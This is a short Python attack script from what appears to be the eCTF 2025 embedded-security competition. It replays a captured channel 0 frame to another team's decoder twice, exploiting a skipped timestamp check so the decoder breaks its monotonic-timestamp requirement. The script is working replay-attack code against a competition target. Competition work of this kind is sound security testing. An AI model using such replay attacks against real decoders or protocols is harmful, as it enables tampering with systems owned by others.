"""Pesky Neighbor attack for tufts
@author: Gavin Zhong, Liz Grzyb
@description: UTEP bypasses the timestamp check for channel 0, so by simply replaying lgmt channel 0 frame,
we can make it violate security requirement 3 (monotonically increasing timestamps)
"""

import time
import sys

# The ectf25 module comes pre-installed in the environment
from ectf25.utils.decoder import DecoderIntf

def lgmt_channel_0() -> bytes:
    """Liz Grzyb
        simply replay lgmt channel 0 frame
    """
    lgmt_frame_channel0 = b"\x00\x00\x00\x00\xc3;\x8cMPX\x06\x00\xb2\xda\xf4\xd9\xbcT\xa0\xf7]@\xe6\xe5~fBJ\xab\x8f\xf7\xe1\xc6-v\n\xae\xdc-\xd4\xc7 \xee\xfb\xf0\xccV(8\xf0Y\x89\xf7\x012j'\x00\xa0\x90\x8b\xba\x90\xc0m\xedU7!%,\xaa/\xef\x80\xcc:\x18d\x92Fy\xbc\xb3\x8d/\x0c\xf8\xcd\x07\xc2\xa2\x18|\x00\xd5\x0e\xe3\xb1\xbc^\xcd\x0brJ"
    return lgmt_frame_channel0


if __name__ == '__main__':
    print("Running Pesky Neighbor attack")
    time.sleep(1)
    
    # The serial port string will be in argv[1]
    interface = DecoderIntf(sys.argv[1])
    # Replay lgmt channel 0 frame
    interface.decode(lgmt_channel_0())
    interface.decode(lgmt_channel_0())

    print("Done with pesky Neighbor attack")
